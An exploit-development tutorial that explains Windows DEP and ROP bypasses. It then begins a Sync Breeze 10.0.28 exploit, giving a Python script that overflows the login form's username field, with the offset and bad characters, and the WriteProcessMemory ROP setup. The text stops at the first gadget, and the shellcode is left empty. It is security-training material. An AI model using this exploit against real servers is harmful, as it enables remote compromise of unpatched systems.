## Bypassing DEP

## What is DEP?

In Windows binary exploitation, **DEP** stands for **Data Execution Prevention**. DEP is a security feature introduced by Microsoft to prevent certain types of exploits, particularly those that attempt to execute code from areas of memory that should only contain data. By marking these areas as non-executable, DEP mitigates risks from buffer overflows and similar memory corruption attacks that often inject malicious code into the stack, heap, or other data sections.

### How DEP Works
1. **Memory Marking**: DEP designates specific memory regions as *non-executable*, so code cannot be executed from these areas. For example:
   - **Stack** and **Heap** regions are typically marked as non-executable.
   - **Code** segments, where legitimate executable code resides, are marked as executable.

2. **Hardware and Software DEP**:
   - **Hardware-enforced DEP**: Uses the CPU’s No-Execute (NX) bit, which marks memory pages as executable or non-executable. This provides robust protection since it leverages CPU hardware.
   - **Software-enforced DEP**: Monitors and prevents certain actions in Windows, but without hardware support, it’s less effective.

### DEP in Exploitation Mitigation
DEP makes it much harder for attackers to execute their payload directly in memory regions meant for data storage. Without DEP, a typical exploit might:
   1. Overflow a buffer on the stack or heap.
   2. Inject malicious code into that area.
   3. Redirect execution to this injected code.

With DEP enabled, the injected code on the stack or heap cannot be executed, as these areas are marked non-executable. This forces attackers to find alternative methods, such as **Return-Oriented Programming (ROP)**, where they use existing executable code snippets to build their payload indirectly.

### Bypassing DEP
While DEP is a strong deterrent, advanced exploit techniques can bypass it:
   - **Return-Oriented Programming (ROP)**: This technique leverages "gadgets"—small instruction sequences ending in a return statement—found in legitimate executable code. By chaining these gadgets, attackers can create complex payloads without needing to inject new executable code.
   - **Memory Corruption in DEP-enabled Code Segments**: If attackers can manipulate function pointers or other control data within executable memory, they may still execute malicious sequences.

### DEP and Exploitation
DEP was a game-changer in making exploits more challenging, especially when combined with other mitigations like **ASLR** (Address Space Layout Randomization). These technologies together increase the difficulty of reliably exploiting vulnerabilities, as they prevent straightforward code injection and make payload development more complex.

## Exploiting Sync Breeze 10.0.28

In this case, we will start by providing an exploit that already includes the offset to reach EIP and the bad characters. This way, we will speed up the process and focus on what’s important.

```py
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        size = 800
        offset = 780

        shellcode = b""
        
        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d

        filler = b"A" * offset
        eip = b"B" * 4

        inputBuffer = filler + eip

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()

```

If we send the exploit we can see four "B" characters at "eip" register. Now we have to begin with the DEP bypassing.

To bypass DEP, we can use several functions of Windows API like "VirtualAlloc", "VirtualProtect", or "WriteProcessMemory". In this case we have selected the "WriteProcessMemory" way.

### What is WriteProcessMemory?

WriteProcessMemory is a Windows API function used to write data to a specific area of memory in a process running on the Windows operating system.

```
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

```

We need to push into the stack 7 values: the "WriteProcessMemory" function address, the return address of the function, and the five arguments. For that we will use an skeleton, which are dummy values that are pushed into the stack, then we will modify these values with ROP gadgets, and finally we will call the function with the desired values.

To start with this ROP challenge we have to move the "esp" address to other register to be able to access and modify the values at the stack. The first ROP gadget will be a "push esp" instruction (if it exists). The first step is finding a module in the binary that is not compiled with "ASLR" and that does not have badchars at the address.

![imagen](https://github.com/user-attachments/assets/2ff7392f-af29-4c29-a26d-268b4e43aaad)

Next, we use the following command in WinDbg --> `!nmod`

![imagen](https://github.com/user-attachments/assets/39150fcf-bcf9-4c05-ab7a-c97beb3797c8)

We see that "libspp.dll" is a good candidate, so we are going to use a tool that extracts the gadgets of that module.

![imagen](https://github.com/user-attachments/assets/3135ca51-0736-4036-8930-57925eec0e83)

We find several gadgets:

![imagen](https://github.com/user-attachments/assets/09344cf2-10c8-4535-a1c4-381893f6c442)

The first one has the badchar "0a" so we choose the second one and we add it to the exploit.

![imagen](https://github.com/user-attachments/assets/e3038ebd-c569-406c-837e-4b0e69cf6963)


